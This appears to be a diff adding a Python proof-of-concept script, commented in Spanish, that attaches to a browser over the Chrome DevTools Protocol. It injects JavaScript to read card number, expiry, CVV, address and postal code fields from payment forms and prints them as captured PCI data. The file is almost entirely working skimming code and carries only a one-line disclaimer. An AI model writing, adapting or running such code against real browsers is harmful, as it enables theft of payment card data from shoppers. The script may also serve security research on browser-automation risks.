@@ -1,0 +1,68 @@
+"""
+tg_payment_intercept.py -- Intercepcion de datos de formulario de pago
+Demuestra como CDP permite acceder a campos del DOM que contienen
+datos PCI antes de su envio al procesador de pagos.
+NOTA: PoC conceptual. No usar contra formularios reales.
+"""
+import websocket
+import json
+
+def intercept_payment_fields(ws_url):
+    """Leer campos de formulario de pago via CDP DOM access."""
+    ws = websocket.create_connection(ws_url)
+    
+    # Inyectar observer que captura valores de inputs
+    js_observer = """
+    (function() {
+        var fields = {};
+        // Buscar campos de pago por atributos comunes
+        var selectors = [
+            'input[name*="card"]',
+            'input[name*="number"]',
+            'input[autocomplete="cc-number"]',
+            'input[autocomplete="cc-exp"]',
+            'input[autocomplete="cc-csc"]',
+            'input[name*="cvv"]',
+            'input[name*="cvc"]',
+            'input[name*="expir"]',
+            'input[name*="address"]',
+            'input[name*="postal"]',
+            'input[name*="zip"]'
+        ];
+        
+        selectors.forEach(function(sel) {
+            var els = document.querySelectorAll(sel);
+            els.forEach(function(el) {
+                fields[el.name || el.id || sel] = {
+                    value: el.value,
+                    type: el.type,
+                    autocomplete: el.autocomplete
+                };
+            });
+        });
+        
+        return JSON.stringify(fields);
+    })();
+    """
+    
+    cmd = json.dumps({
+        "id": 1,
+        "method": "Runtime.evaluate",
+        "params": {"expression": js_observer, "returnByValue": True}
+    })
+    ws.send(cmd)
+    result = json.loads(ws.recv())
+    
+    payment_data = json.loads(
+        result["result"]["result"]["value"]
+    )
+    
+    if payment_data:
+        print("[!] DATOS PCI CAPTURADOS:")
+        for field, info in payment_data.items():
+            print(f"    {field}: {info}")
+    else:
+        print("[-] No se encontraron campos de pago activos")
+    
+    ws.close()
+    return payment_data
